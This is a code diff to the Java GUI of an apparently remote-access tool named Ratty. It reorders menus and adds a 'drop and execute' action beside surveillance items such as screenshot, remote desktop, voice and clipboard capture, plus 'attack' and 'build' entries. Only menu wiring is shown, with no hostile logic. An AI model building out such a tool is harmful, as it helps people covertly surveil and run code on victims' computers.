@@ -12,7 +12,7 @@ import java.awt.event.MouseEvent;
 import java.awt.image.BufferedImage;
 import java.io.File;
 import java.util.Arrays;
-import java.util.HashMap;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
@@ -72,10 +72,10 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	private static final String FILE_MANAGEMENT = LANGUAGE.getString("menu.file_management");
 	private static final String UTILITY = LANGUAGE.getString("menu.utility");
 	private static final String OTHER = LANGUAGE.getString("menu.other");
-	private static final HashMap<String, BufferedImage> FILE_MANAGEMENT_ITEM_DATA = new HashMap<String, BufferedImage>();
-	private static final HashMap<String, BufferedImage> SURVEILLANCE_ITEM_DATA = new HashMap<String, BufferedImage>();
-	private static final HashMap<String, BufferedImage> UTILITY_ITEM_DATA = new HashMap<String, BufferedImage>();
-	private static final HashMap<String, BufferedImage> OTHER_ITEM_DATA = new HashMap<String, BufferedImage>();
+	private static final LinkedHashMap<String, BufferedImage> FILE_MANAGEMENT_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
+	private static final LinkedHashMap<String, BufferedImage> SURVEILLANCE_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
+	private static final LinkedHashMap<String, BufferedImage> UTILITY_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
+	private static final LinkedHashMap<String, BufferedImage> OTHER_ITEM_DATA = new LinkedHashMap<String, BufferedImage>();
 	
 	public static final String POPUP = LANGUAGE.getString("action.popup");
 	public static final String SCREENSHOT = LANGUAGE.getString("action.screenshot");
@@ -90,20 +90,22 @@ final class RattyGui extends AbstractListenerContainer<IGuiController> {
 	public static final String FREE = LANGUAGE.getString("action.free");
 	public static final String BUILD = LANGUAGE.getString("action.build");
 	public static final String ATTACK = LANGUAGE.getString("action.attack");
+	public static final String DROP_EXECUTE = LANGUAGE.getString("action.drop_execute");
 	
 	public static final List<BufferedImage> GUI_ICONS = Arrays.asList(GUI_ICON_SMALL, GUI_ICON_MEDIUM, GUI_ICON_LARGE);
 	
 	static {
-		FILE_MANAGEMENT_ITEM_DATA.put(FILES, MENU_ICONS[4]);
-		FILE_MANAGEMENT_ITEM_DATA.put(UPLOAD_EXECUTE, MENU_ICONS[9]);
 		SURVEILLANCE_ITEM_DATA.put(SCREENSHOT, MENU_ICONS[1]);
 		SURVEILLANCE_ITEM_DATA.put(DESKTOP, MENU_ICONS[2]);
 		SURVEILLANCE_ITEM_DATA.put(VOICE, MENU_ICONS[3]);
 		SURVEILLANCE_ITEM_DATA.put(CLIPBOARD, MENU_ICONS[6]);
+		FILE_MANAGEMENT_ITEM_DATA.put(FILES, MENU_ICONS[4]);
+		FILE_MANAGEMENT_ITEM_DATA.put(UPLOAD_EXECUTE, MENU_ICONS[9]);
+		FILE_MANAGEMENT_ITEM_DATA.put(DROP_EXECUTE, MENU_ICONS[11]);
 		UTILITY_ITEM_DATA.put(POPUP, MENU_ICONS[0]);
 		UTILITY_ITEM_DATA.put(COMMAND, MENU_ICONS[5]);
-		UTILITY_ITEM_DATA.put(AUDIO, MENU_ICONS[7]);
 		UTILITY_ITEM_DATA.put(WEBSITE, MENU_ICONS[8]);
+		UTILITY_ITEM_DATA.put(AUDIO, MENU_ICONS[7]);
 		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[10]);
 	}
 	
